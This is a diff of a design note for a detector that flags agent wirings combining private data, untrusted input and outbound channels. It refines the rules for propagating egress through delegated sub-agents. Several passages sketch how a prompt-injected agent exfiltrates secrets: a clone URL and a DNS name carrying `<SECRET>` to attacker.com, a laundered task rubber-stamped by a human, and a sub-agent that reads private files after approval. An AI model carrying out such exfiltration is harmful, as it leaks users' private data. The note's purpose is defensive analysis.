@@ -1,14 +1,15 @@
 # Trifecta detector
 
 Status: **designed, not built.** The shape is settled — three legs, two
-strength lattices, per-node max over the tree — and a paper dry-run on the
-demos validated the verdicts. But a 2026-08-08 review pass against the
-actual wiring found **five holes that block implementation**, collected in
-"Open items from the 2026-08-08 review pass" and marked ⛔ inline in the v1
-scope list. Until those close, "core algorithm is settled" is an
-overstatement: the graded egress axis was folded in at the bottom of this
-file and the normative sections above it still describe flat egress (each
-now carries a superseded marker).
+strength lattices, per-node max over the tree, `min` across a delegation —
+and a paper dry-run on the demos validated the verdicts. A 2026-08-08 review
+pass against the actual wiring found five holes that block implementation,
+collected in "Open items from the 2026-08-08 review pass" and marked ⛔
+inline in the v1 scope list; **item 1 (propagation) is closed, four remain**.
+Until they do, "core algorithm is settled" is an overstatement — and note
+that the graded egress axis was folded in at the bottom of this file, so the
+normative sections above it still describe flat egress (each carries a
+superseded marker).
 
 Parked threads, older than that review:
 
@@ -17,8 +18,9 @@ Parked threads, older than that review:
 2. Does a *local file read* carry `:untrusted`? — the tag table and the
    narrative disagree (a genuine gap in the "settled" rules). **Elevated
    to ship-blocking: review item 4.**
-3. `:egress_writeonly` (the `web_search` write-only insight as a tag) —
-   deferred; inert until a search-only persona exists.
+3. `:egress_searchengine` (was `:egress_writeonly`) — still deferred, but no
+   longer *inert*: a search-only persona is the cheapest fix for the one
+   hole the series cap leaves open. Ship the tag and the persona together.
 4. `git_clone` as a readable egress verb + the per-agent **poisoned**
    assumption question (may already be the untrusted-strength lattice).
 5. Graded egress axis — **resolved into v1** (2026-08-08): two reachable
@@ -361,13 +363,13 @@ moment it reads a hard-`:untrusted` local file (bash / `Read` over a hostile
 file on disk). Separation only raised the bar; the gate on the task string is
 what is meant to hold the line there.
 
-*Both halves of that reading are now contested by the review items, and the
-same two decide it for `pikuri-computer` too: whether the propagated
-`RESEARCHER` egress is capped at approver by the gated delegation or arrives
-hard (**item 1**), and whether a local file read carries hard `:untrusted` at
-all — here it is asserted, while the tag table says no (**item 4**). Left as
-written, since it is exactly the pair of assumptions the dry-run made
-visible.*
+*Half of that reading is now settled and half is still open. The propagated
+`RESEARCHER` egress **is** capped at `approver` by the gated delegation
+(**item 1**, series cap — the persona holds no `:private`), so the parent's
+egress leg is `egress_human_approver`, not hard. Whether a local file read
+carries hard `:untrusted` is still open — asserted here, denied by the tag
+table (**item 4**) — and it is the only thing standing between this wiring's
+soft and a silent two-leg reading.*
 
 ### Does a patient human approver stop egress? (No — only a rewriter)
 
@@ -469,7 +471,7 @@ from "More open questions (b)", the verdicts become:
 | binary / mode | egress leg, classified | verdict |
 |---|---|---|
 | **pikuri-computer**, `--no-internet` | compose → **approver**; bash kernel-severed → none | flat **loud** → **soft** |
-| **pikuri-computer**, default (internet ON) | compose → **approver**; `agent(editable:)` → approver, *but* `RESEARCHER` holds `fetch` = hard | **loud** — see open item 1 |
+| **pikuri-computer**, default (internet ON) | compose → **approver**; `RESEARCHER`'s hard `fetch` capped at **approver** by the gated delegation (series cap, item 1 — the researcher holds no `:private`) | flat **loud** → **soft** |
 | **pikuri-thunderbird** (both `allow_` flags on) | compose + `.ics` wizard → **approver** | flat **loud** → **soft** |
 | **pikuri-thunderbird** default `Extension` (flags off) | *no egress leg at all* | **silent** (2 legs, severed by construction) |
 | **pikuri-code**, private repo | bash behind a confirmer → **hard** (command ≠ payload) | **loud**, unchanged |
@@ -477,9 +479,9 @@ from "More open questions (b)", the verdicts become:
 Two notes this run added:
 
 - The demo binaries stop being uniformly loud, so "loud" carries
-  information again — and the surviving loud ones are the agents that
-  really can egress bytes nobody read (pikuri-code's bash; the researcher's
-  `fetch` behind pikuri-computer's gated task string, pending open item 1).
+  information again — and the one surviving loud verdict is **pikuri-code**,
+  the agent that really can egress bytes nobody read (bash computes its
+  payload at runtime). Everything human-gated drops to soft.
 - **Thunderbird is the one place `:private` is framework-knowable.** The
   asymmetry rule says sensitivity is a property of the data, so the user
   declares it — but a *mailbox* is private by domain, not by configuration,
@@ -499,10 +501,11 @@ Per-node detail (the max-over-tree the report would attribute):
   dominated. Verdict **loud, attributed to the parent node**. The
   internet toggle is **verdict-neutral**: dropping the researcher
   removes only redundant legs. *(Flat-egress reading. Under the graded
-  axis the toggle stops being neutral — compose alone is `approver` →
-  soft, while the researcher's `fetch` is the one hard-egress leg left,
-  so the toggle becomes the soft/loud lever. Exactly what open item 1
-  has to settle.)*
+  axis the verdict drops to soft in both modes and the toggle stays
+  verdict-neutral for a different reason: compose is `approver`, and the
+  series cap (item 1) holds the researcher's `fetch` at `approver` too,
+  since that persona carries no `:private`. What the toggle changes is the
+  number of approver-gated legs, not the class of the worst one.)*
 - **pikuri-code** — the parent holds **direct** egress via bash, because
   Bubblewrap keeps `--share-net` (needed for `gem`/`bundle`/`mvn`/`pip`).
   So the sub-agent quarantine of the web tools does **not** remove the
@@ -548,10 +551,9 @@ Per-node detail (the max-over-tree the report would attribute):
 2. **pikuri-computer — the flagship 'reassembled trifecta done safely'
    demo — trips the loudest alarm, in *both* modes** *(under the
    flat-egress algorithm only; the graded axis in "More open questions (b)"
-   revises `--no-internet` down to **soft**, since compose passes the
-   payload-visibility test. The default mode stays **loud** unless a gated
-   delegation also caps the sub-agent's own hard `fetch` — open item 1.)*
-   That's correct, not a
+   revises **both** modes down to **soft** — compose passes the
+   payload-visibility test, and the series cap of item 1 holds the
+   researcher's `fetch` at `approver` as well.)* That's correct, not a
    bug: it *is* a full trifecta; the safety is the human commit in
    Thunderbird's UI + the kernel-severed bash + the approved researcher
    task, none of which is leg-*absence*. This is the single best teaching
@@ -590,12 +592,23 @@ Per-node detail (the max-over-tree the report would attribute):
   hard `:egress`") is therefore **superseded** — it holds only for a gate
   the human sees a *proxy* through, which is bash, not compose.
 
-## Proposed tag `:egress_writeonly` (the `:egress_untargeted` idea)
+## Proposed tag `:egress_searchengine` (was `:egress_writeonly` / `:egress_untargeted`)
 
 The proposal: `web_search` is egress, but the attacker can't *read back*
 what leaked — the query goes to a pikuri-picked engine, write-only from
 the attacker's view. So an agent whose only egress is search is safer
 than one that can `fetch` an attacker-chosen URL.
+
+**On the name** (renamed 2026-08-08): "write-only" kept being misread as a
+property of the *plumbing* rather than of the destination — it describes the
+direction bytes flow, when the security property is *who chose the target*.
+`:egress_searchengine` is a placeholder that at least points at the right
+thing: a small set of sinks where the attacker **cannot land their own
+code**, as opposed to a `gist.github.com` URL they control. The concept
+generalises past search, so a better name probably describes the pinned
+destination — `:egress_pinned_sink`, i.e. the caller cannot choose where
+the bytes land — but nobody should rename it a third time before the tag
+actually ships.
 
 **The insight is correct and already load-bearing** — it's the
 `web_search`-vs-`fetch` distinction in the pikuri-os section above
@@ -606,7 +619,7 @@ Notes on doing it well:
 - **Name it for what it defends, not the mechanism.** "Untargeted" is
   slightly wrong: the attacker *does* target the content (the secret
   rides in the query string) — what they can't do is **read the
-  response**. `:egress_writeonly` / `:egress_blind` says the actual
+  response**. `:egress_searchengine` / `:egress_blind` says the actual
   property. The naming test also correctly **excludes DNS**: a lookup of
   `<secret>.attacker.com` is query-shaped but the hostname is fully
   readable at the attacker's nameserver → stays hard `:egress`. "It's
@@ -619,11 +632,11 @@ Notes on doing it well:
   request is not attacker-readable in flight or at rest (excludes DNS;
   excludes a search whose engine the attacker chose/compromised).
 - **Lattice + union.** Treat it as a *soft* egress, twin of
-  `untrusted_weakened`: `none < egress_writeonly < egress`, union = max.
-  `{private, untrusted, egress_writeonly}` → **soft notice** (secret can
+  `untrusted_weakened`: `none < egress_searchengine < egress`, union = max.
+  `{private, untrusted, egress_searchengine}` → **soft notice** (secret can
   be pushed out but not retrieved — a real, large reduction, matching the
   "not 'any'" bound on patient approval); any readable egress present →
-  `egress_writeonly ⊔ egress = egress` → loud. This is the correct
+  `egress_searchengine ⊔ egress = egress` → loud. This is the correct
   guard against the drip / existence-oracle channel: write-only search is
   only safe as the **sole** egress leg — the moment a second readable
   action exists, results-that-depend-on-the-secret become a targeting
@@ -632,9 +645,23 @@ Notes on doing it well:
   holds `web_search` (`RESEARCHER`, `GIT_REPO_RESEARCHER`) *also* holds
   `fetch` + `web_scrape` → hard egress dominates; there is no search-only
   agent in the tree today. The tag only earns its keep paired with a
-  **search-only researcher persona** (drop `fetch`/`web_scrape`), at which
-  point the soft verdict becomes reachable and meaningful. Ship them
-  together or not at all. Filed as a deferred idea, not v1.
+  **search-only persona** (no `fetch`, no `web_scrape`), at which point the
+  soft verdict becomes reachable and meaningful. Ship them together or not
+  at all. Filed as a deferred idea, not v1.
+- **Re-priced 2026-08-08: the pairing now has a concrete motivation.** The
+  deferral above reads as "inert until someone happens to want a search-only
+  persona." It is better than that: a search-only persona is the **cheapest
+  available fix for the one hole the series cap leaves open** in
+  `pikuri-computer` — the rubber-stamped `y` on a clean laundered task
+  ("Reassembled trifecta" below). Pin the destination and a rubber-stamp
+  leaks to a pikuri-picked engine instead of to the attacker, so the soft
+  verdict would rest on two independent grounds rather than leaning entirely
+  on the gate plus the researcher's missing filesystem.
+
+  The fork, not a free win: a researcher that cannot open the pages it finds
+  is much weaker — snippets only. So this is probably a **second persona**
+  (`SEARCHER` alongside `RESEARCHER`) and a host choosing between them per
+  wiring, not a crippled `RESEARCHER`. Pricing that trade is the open part.
 
 ## More open questions (documented, NOT pursued — revisit later)
 
@@ -649,7 +676,7 @@ Concrete hole: a poisoned parent can launder a secret into a clone URL —
 `agent(git_repo_researcher, "clone https://attacker.com/?q=<SECRET>")`.
 The clone *host* is attacker-chosen and the request reaches it, so
 `git_clone` is a **readable** egress verb, same family as `fetch` — **not**
-a candidate for the `:egress_writeonly` bucket. (This doesn't change the
+a candidate for the `:egress_searchengine` bucket. (This doesn't change the
 dry-run verdicts: `GIT_REPO_RESEARCHER` still holds no `:private`, so its
 node doesn't fire, and its propagated `:egress` was already dominated. It
 *does* mean the "harmless" framing of that persona is only true because it
@@ -729,10 +756,11 @@ safer than an autonomous-egress build, but **not silent** (hard untrusted =
 live injection vector; the pre-filled compose is rubber-stampable). Silent
 needs *either* author-mode compose (no pre-fill) *or* privilege-separating
 the mail read so untrusted drops to weakened. So the user is right that it
-softens; the correction is soft, not safe. *(Note the scope: this is the
-`--no-internet` wiring. The **default** mode adds `RESEARCHER`'s hard
-`fetch`, which under the identity relabel propagates up hard and keeps the
-parent loud — open item 1.)*
+softens; the correction is soft, not safe. *(Scope note, settled by item 1:
+the **default** mode reads the same. `RESEARCHER`'s hard `fetch` is capped
+at `approver` by the gated delegation, because that persona holds no
+`:private` of its own — so the internet toggle changes how many
+approver-gated legs exist, not the verdict.)*
 
 #### What separates `human_approver` from autonomous: payload visibility
 
@@ -781,7 +809,7 @@ autonomous-payload egress with a human blessing the wrapper) while the
 Thunderbird/researcher seats drop to **soft**. That is the contrast
 finding #2 was asking for — see the revised table under "Results".
 
-**Do not merge this with `:egress_writeonly`.** Write-only grades
+**Do not merge this with `:egress_searchengine`.** Write-only grades
 *attacker readability of the response*; payload visibility grades *what
 the human saw*. Genuinely orthogonal — a readable human-gated egress and a
 blind autonomous one are different animals. The 2-D (untrusted × egress)
@@ -880,40 +908,63 @@ answer is therefore per-seat rather than global.*
 ## Open items from the 2026-08-08 review pass
 
 Raised by reading the note against the actual wiring after the graded-egress
-fold-in. Items 1–5 are **ship-blocking for v1** — each is a rule the
+fold-in. Items 2–5 are **ship-blocking for v1** — each is a rule the
 implementer would otherwise have to invent; 6–7 are sharpenings that change
-what we claim, not what we build.
+what we claim, not what we build. **Item 1 is closed** (2026-08-08) and kept
+below as the derivation.
 
-### 1. Does a gated delegation *cap* the propagated egress leg? (series vs parallel)
+### 1. Does a gated delegation *cap* the propagated egress leg? — RESOLVED: yes, in series
 
-The contradiction that forced this list. v1 says the boundary relabel is
+The contradiction that forced this list. v1 said the boundary relabel is
 identity for egress ("an egress level survives the boundary at its own
-strength"), so `RESEARCHER`'s hard `fetch` propagates up hard and
-**pikuri-computer's default mode is loud**, not soft. But the revised
-dry-run table wanted soft, on the grounds that the only parent→outside
-channel is the *editable task string* the human authored — i.e. it silently
-let the gate attenuate the propagated leg, which is exactly the propagation
-exception v1's last bullet forbids.
+strength"), so `RESEARCHER`'s hard `fetch` propagated up hard and
+**pikuri-computer's default mode came out loud**. But the revised dry-run
+table wanted soft, on the grounds that the only parent→outside channel is
+the *editable task string* — i.e. it silently let the gate attenuate the
+propagated leg.
 
-Both readings are defensible and they disagree on the flagship demo, so it
-has to be decided, not left implicit. The proposal worth testing:
+**Resolution: the cap is real, and provable here rather than stipulated.**
+Ask what can reach an attacker-readable sink through the researcher path.
+The parent writes a task string; the human sees it; it crosses.
+`RESEARCHER` then searches and fetches autonomously — but the only
+parent-private bytes it holds are the ones in that task string, **because it
+has no filesystem** (`add_sub_agent_tool`, no `Workspace`). So even a fully
+poisoned researcher can exfiltrate nothing but a string a human already
+approved as leaving. The child's hard egress cannot exceed the channel that
+feeds it.
 
-> **Union at a node is `max` (parallel legs). Propagation through a gated
-> channel is `min` (series — the weakest link bounds what can cross).**
+> **Series cap.** A parent's propagated egress level =
+> `min(delegation-channel level, child's egress level)` — **provided the
+> child holds no `:private` leg of its own.** Otherwise the leg propagates
+> uncapped.
+>
+> `min` in series (through a channel), `max` in parallel (legs at one node).
 
-The direction asymmetry then falls out instead of being stipulated: the
-**outbound** path (parent → child, gated by the confirmer on the task
-string) takes the min-cap, so a `human_approver` delegation caps a hard-
-egress child at approver; the **inbound** path (the child's return value,
-ungated) is where `untrusted` attenuates by the instruction/content
-argument. One rule, both relabels, and it re-hardens automatically when the
-delegation isn't gated (item 2).
+This is a composition rule with a precondition, not a case analysis on
+"dangerous" children, so it does not reintroduce the propagation exception
+v1's last bullet rejects. The direction asymmetry also stops being
+stipulated: the **outbound** path (parent → child, through the gate) takes
+the min-cap; the **inbound** path (the child's return value, ungated) is
+where `untrusted` attenuates by the instruction/content argument. And it
+re-hardens automatically when the delegation isn't gated (item 2).
 
-What to check before adopting it: does min-cap ever *under*-warn? The child
-is bounded by the task string only if it holds no private data of its own
-and cannot be steered by what it reads mid-task into egressing more than
-the task carried — the second half is not obviously true for a researcher
-that `fetch`es attacker-authored pages and then `fetch`es again.
+**The precondition is load-bearing — here is the case that proves it.** Give
+the child file tools. The human approves an innocuous task ("summarise
+`/etc/foo` and look up related material"); the child then reads private data
+*after* the gate and egresses a derivative of bytes the human never saw. The
+cap fails silently. Note per-node evaluation does not catch this either: a
+child holding `{private, hard egress}` with no untrusted leg never fires on
+its own node, so without the precondition the tree would read soft when it
+should read loud.
+
+**Consequences.**
+
+- `pikuri-computer` is `{private, untrusted(hard), egress_human_approver}` →
+  **soft in both modes**, and the revised dry-run table is restored to that.
+- The two reachable egress levels are now enough to classify every built
+  wiring — no third rung needed.
+- The one hole the cap leaves is the rubber-stamped `y` on a clean laundered
+  task, which is what re-prices `:egress_searchengine` (see that section).
 
 ### 2. The egress *level* is a property of the wiring, not just the field set
 
@@ -1028,6 +1079,18 @@ Independent of the five open items above (this is about presentation, not
 the rule set): how it shows up to a *reader* is unsettled. To
 brainstorm next (the *what*, not yet the technical *how*):
 
+- **Reconcile ch7's "binary in presence" with the graded legs.**
+  `book/07-os-assistant.md` §"The lesson, both axes in one line" teaches
+  that the trifecta is *binary in presence* and *graded in severity by the
+  size of the private pool*. That is not wrong, but it is now incomplete:
+  the egress leg is tri-state (none / approver-gated / autonomous) and the
+  untrusted leg two-state. The fix keeps ch7's actual teaching point — no
+  partial credit for 2.5 legs, which is what kills "we're probably fine" —
+  and adds that a leg's **presence** is binary while its **strength** is
+  not, so severity grades on two independent things: pool size *and* leg
+  strength. An approver-gated egress leg is still a leg: assembled, warned,
+  not silent. Batch this with whatever else ch7 needs when the detector
+  lands, rather than piecemeal.
 - Which `bin/pikuri-*` and `book/` examples deliberately *should*
   trip the detector as a teaching moment, and which should be wired to
   stay quiet so the contrast is legible.
@@ -1046,9 +1109,10 @@ brainstorm next (the *what*, not yet the technical *how*):
 *Revised 2026-08-08: the graded egress axis is in, at two levels. The
 earlier flat-`:egress` version of this list is superseded.*
 
-**Five holes, marked inline as ⛔ — this list is not yet buildable.** See
+**Four holes, marked inline as ⛔ — this list is not yet buildable.** See
 "Open items from the 2026-08-08 review pass"; each ⛔ names the item that
-has to close first.
+has to close first. (Item 1 closed 2026-08-08 — the series cap, folded into
+the boundary-relabel bullet below.)
 
 - Tags `:private` (user, default off) / `:untrusted` / `:egress`
   (framework, default on) / `:untrusted_weakened` (computed) /
@@ -1068,11 +1132,11 @@ has to close first.
   hard `:egress`. ⛔ **item 2** — visibility is necessary, not sufficient:
   the level also depends on whether the tool's *gate* can block on a human
   at all (`AUTO_APPROVE`, `passive_detector`, `--no-sandbox`).
-- Boundary relabel: `untrusted→untrusted_weakened`, everything else
-  identity (an egress level survives the boundary at its own strength).
-  ⛔ **item 1** — this is what makes pikuri-computer's default mode loud;
-  if a gated delegation caps the propagated leg instead (series = min), it
-  is soft. The flagship verdict hangs on this bullet.
+- Boundary relabel, **settled by item 1**: `max` in parallel (legs at one
+  node), `min` in series (through a delegation channel). Outbound, the
+  parent's propagated egress = `min(channel level, child's level)` **iff the
+  child holds no `:private`** — otherwise uncapped. Inbound,
+  `untrusted → untrusted_weakened`; `:private` is identity.
 - Evaluate every node; verdict = max over tree; report the path.
 - Verdict grid, `:private` present:
 
@@ -1087,7 +1151,9 @@ has to close first.
 
 - **Not** in v1: `egress_human_author` / the `info` cell (unreachable in
   every built seat — pre-fill demotes it; keep it a spec-level ideal) and
-  `:egress_writeonly` (changes no current verdict).
+  `:egress_searchengine` (changes no current verdict — but it is the
+  cheapest hardening of the rubber-stamp hole, so it ships the day a
+  search-only persona does).
 - Warn-only, once per process, message names the leg to break. ⛔ **item 3**
   — "once per process" is wrong if `mcp_connect` can add legs mid-session;
   key the dedup on the verdict, not the process.
